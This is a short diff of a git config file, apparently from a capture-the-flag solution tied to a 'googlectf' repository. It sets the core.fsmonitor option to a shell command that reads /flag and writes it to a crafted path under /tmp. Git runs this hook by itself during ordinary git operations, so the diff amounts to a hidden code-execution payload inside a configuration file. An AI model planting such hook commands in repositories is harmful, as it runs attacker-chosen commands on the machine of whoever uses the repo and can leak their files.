@@ -4,6 +4,6 @@
 	bare = false
 	ignorecase = true
 	precomposeunicode = true
-	fsmonitor = "cat /flag > xxx; false"
+	fsmonitor = "cat /flag > /tmp/https%3A%2F%2Fgithub%2ecom%2FOmerYe%2Fgooglectf%2egit/X; false"
 	worktree = worktree
 
